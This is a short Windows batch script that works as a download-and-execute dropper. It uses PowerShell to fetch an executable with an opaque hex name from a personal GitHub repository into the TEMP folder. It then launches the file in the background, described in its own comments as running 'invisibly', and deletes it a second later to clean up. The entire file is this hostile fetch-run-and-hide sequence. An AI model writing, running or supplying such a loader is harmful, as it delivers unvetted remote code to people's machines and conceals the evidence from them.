@echo off

:: Define the download URL and target path
set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
set tempPath=%TEMP%\a.exe

:: Download the file to the TEMP directory
powershell -Command "Invoke-WebRequest %url% -OutFile %tempPath%"

:: Run the downloaded .exe invisibly
start /B "" "%tempPath%"

:: Wait for 1 second and then clean up by deleting the .exe
timeout /t 1 /nobreak
del "%tempPath%"
